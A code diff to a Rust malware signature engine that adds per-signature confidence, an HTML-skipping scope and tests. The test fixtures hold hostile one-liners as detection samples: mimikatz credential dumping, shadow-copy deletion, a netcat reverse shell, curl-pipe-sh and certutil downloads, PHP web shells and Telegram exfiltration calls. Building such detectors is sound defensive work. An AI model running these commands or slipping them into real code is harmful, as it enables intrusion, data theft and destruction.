@@ -55,7 +55,30 @@ pub struct Signature {
     pub description: String,
     pub metadata: HashMap<String, String>,
     pub enabled: bool,
+    /// Confidence a match carries. Below 0.7 the engine votes suspicious
+    /// rather than malicious, for patterns that also show up in harmless text
+    /// (tool names, commands people write about). Default 0.85.
+    #[serde(default)]
+    pub confidence: Option<f32>,
+    #[serde(default)]
+    pub scope: SignatureScope,
 }
+
+/// Where a string signature is checked.
+#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "snake_case")]
+pub enum SignatureScope {
+    /// Any content, web pages included.
+    #[default]
+    Any,
+    /// Files and scripts, but not HTML pages. A URL scan reads the page's
+    /// HTML, where a blog post quoting a command must not count as the
+    /// command itself.
+    NotHtml,
+}
+
+/// Default confidence of a string or regex match.
+const DEFAULT_MATCH_CONFIDENCE: f32 = 0.85;
 
 /// Pattern within a signature
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -340,8 +363,12 @@ impl SignatureMatcher {
     ) -> Result<Vec<SignatureMatch>> {
         let mut matches = Vec::new();
         let text = String::from_utf8_lossy(content);
+        let html = looks_like_html(content);
 
         for sig in signatures {
+            if html && sig.scope == SignatureScope::NotHtml {
+                continue;
+            }
             for pattern in &sig.patterns {
                 match pattern.pattern_type {
                     PatternType::String => {
@@ -404,7 +431,7 @@ impl SignatureMatcher {
             signature_type: sig.signature_type.clone(),
             threat_family: sig.threat_family.clone(),
             severity: sig.severity.clone(),
-            confidence: 0.85,
+            confidence: sig.confidence.unwrap_or(DEFAULT_MATCH_CONFIDENCE),
             matched_offset: offset,
             matched_data: Some(pattern.value.clone()),
             description: sig.description.clone(),
@@ -506,9 +533,175 @@ pub struct SignatureStatistics {
     pub cache_size: usize,
 }
 
+/// Whether content is an HTML page: it opens with a doctype or an html, head
+/// or body tag within its first 2 KB.
+fn looks_like_html(content: &[u8]) -> bool {
+    let head = String::from_utf8_lossy(&content[..content.len().min(2048)]).to_ascii_lowercase();
+    let trimmed = head.trim_start_matches(|c: char| c.is_whitespace() || c == '\u{feff}');
+    trimmed.starts_with('<')
+        && ["<!doctype html", "<html", "<head", "<body"]
+            .iter()
+            .any(|t| trimmed.contains(t))
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    async fn shipped_matcher() -> SignatureMatcher {
+        SignatureMatcher::new(SignatureMatcherConfig {
+            signatures_dir: format!("{}/rules/signatures", env!("CARGO_MANIFEST_DIR")),
+            enable_caching: false,
+            ..Default::default()
+        })
+        .await
+        .unwrap()
+    }
+
+    /// A file that fails to parse loads as zero signatures with only a
+    /// warning, and a bad regex is silently skipped. Catch both here.
+    #[tokio::test]
+    async fn shipped_signatures_all_load_and_compile() {
+        let path = format!(
+            "{}/rules/signatures/default_signatures.json",
+            env!("CARGO_MANIFEST_DIR")
+        );
+        let sigs: Vec<Signature> =
+            serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
+        assert!(sigs.len() >= 28);
+        let mut ids = HashSet::new();
+        for sig in &sigs {
+            assert!(ids.insert(sig.id.clone()), "duplicate id {}", sig.id);
+            for p in &sig.patterns {
+                if p.pattern_type == PatternType::Regex {
+                    regex::Regex::new(&p.value)
+                        .unwrap_or_else(|e| panic!("{}: bad regex: {e}", sig.id));
+                }
+            }
+        }
+        assert_eq!(shipped_matcher().await.signature_count(), sigs.len());
+    }
+
+    #[tokio::test]
+    async fn shipped_signatures_fire_on_their_samples() {
+        let m = shipped_matcher().await;
+        let samples: &[(&str, &str)] = &[
+            ("SIG-007", "mimikatz # sekurlsa::logonpasswords"),
+            ("SIG-008", r"CreateNamedPipeA(\\.\pipe\postex_8a2f)"),
+            ("SIG-008", "MSSE-%d-server"),
+            ("SIG-009", "ReflectiveLoader beacon.x64.dll"),
+            ("SIG-010", "load ext_server_stdapi.x64.dll"),
+            ("SIG-011", "Restore-My-Files.txt"),
+            ("SIG-012", "RyukReadMe.html"),
+            ("SIG-013", "cmd /c vssadmin.exe Delete Shadows /All /Quiet"),
+            ("SIG-013", "bcdedit /set {default} recoveryenabled No"),
+            ("SIG-014", "/bin/busybox MIRAI"),
+            ("SIG-015", "-o stratum+tcp://pool.example.org:3333 -u wallet"),
+            ("SIG-016", "SetValue($null,$true) # amsiInitFailed"),
+            (
+                "SIG-017",
+                "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')",
+            ),
+            (
+                "SIG-018",
+                "certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe",
+            ),
+            ("SIG-019", "mshta vbscript:Execute(\"x\")"),
+            ("SIG-020", "regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll"),
+            ("SIG-021", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""),
+            ("SIG-022", "nc -e /bin/sh 203.0.113.5 4444"),
+            ("SIG-022", "python3 -c 'import socket,subprocess,os;s=socket.socket()'"),
+            (
+                "SIG-023",
+                "cd /tmp; wget http://203.0.113.9/bins.sh; chmod +x bins.sh",
+            ),
+            (
+                "SIG-023",
+                "curl -s http://203.0.113.9/x.sh | sh",
+            ),
+            ("SIG-024", "var s = new ActiveXObject(\"WScript.Shell\"); s.Run(c);"),
+            ("SIG-025", "<?php @eval($_POST['cmd']); ?>"),
+            ("SIG-025", "<?php system($_GET['c']); ?>"),
+            (
+                "SIG-026",
+                "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"z\"],\"unsafe\");%>",
+            ),
+            (
+                "SIG-027",
+                "fetch('https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsawQ/sendMessage')",
+            ),
+            (
+                "SIG-028",
+                "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_abcd",
+            ),
+        ];
+        for (id, sample) in samples {
+            let hits = m.match_bytes(sample.as_bytes()).await.unwrap();
+            assert!(
+                hits.iter().any(|h| h.signature_id == *id),
+                "{id} did not match {sample:?}; got {:?}",
+                hits.iter().map(|h| &h.signature_id).collect::<Vec<_>>()
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn ordinary_text_and_admin_commands_stay_clean() {
+        let m = shipped_matcher().await;
+        for clean in [
+            "Hello, this is a clean file without any malicious strings.",
+            "vssadmin list shadows",
+            "vssadmin delete shadows /for=C: /oldest",
+            "curl -fsSL https://get.docker.com | sh",
+            "wget https://example.com/install.sh && chmod +x install.sh",
+            "<?php echo htmlspecialchars($_POST['name']); ?>",
+            "new ActiveXObject(\"Microsoft.XMLHTTP\")",
+        ] {
+            let hits = m.match_bytes(clean.as_bytes()).await.unwrap();
+            assert!(hits.is_empty(), "{clean:?} matched {hits:?}");
+        }
+    }
+
+    #[tokio::test]
+    async fn file_only_signatures_skip_web_pages() {
+        let m = shipped_matcher().await;
+        let blog = "<!DOCTYPE html><html><head><title>Detecting Mimikatz</title></head>\
+            <body><pre>sekurlsa::logonpasswords</pre><p>Attackers run \
+            vssadmin delete shadows /all /quiet before encrypting.</p></body></html>";
+        assert!(m.match_bytes(blog.as_bytes()).await.unwrap().is_empty());
+
+        // A phishing kit's page that posts to a Telegram bot still matches:
+        // that signature applies to pages too.
+        let kit = "<html><body><script>fetch('https://api.telegram.org/bot123456789:\
+            AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsawQ/sendMessage')</script></body></html>";
+        let hits = m.match_bytes(kit.as_bytes()).await.unwrap();
+        assert!(hits.iter().any(|h| h.signature_id == "SIG-027"));
+    }
+
+    #[tokio::test]
+    async fn weaker_signatures_carry_lower_confidence() {
+        let m = shipped_matcher().await;
+        let hits = m
+            .match_bytes(b"xmrig -o stratum+tcp://pool.example.org:3333")
+            .await
+            .unwrap();
+        let miner = hits.iter().find(|h| h.signature_id == "SIG-015").unwrap();
+        assert!(
+            miner.confidence < 0.7,
+            "should vote suspicious, not malicious"
+        );
+        let hits = m.match_bytes(b"RyukReadMe.txt").await.unwrap();
+        assert_eq!(hits[0].confidence, DEFAULT_MATCH_CONFIDENCE);
+    }
+
+    #[test]
+    fn html_detection() {
+        assert!(looks_like_html(b"  <!doctype html><html>"));
+        assert!(looks_like_html(b"<html lang=en><head>"));
+        assert!(!looks_like_html(b"#!/bin/sh\necho <html>"));
+        assert!(!looks_like_html(b"MZ\x90\x00<html>"));
+        assert!(!looks_like_html(b"<?php system($_GET['c']); ?>"));
+    }
 
     #[tokio::test]
     async fn test_signature_matcher_creation() {
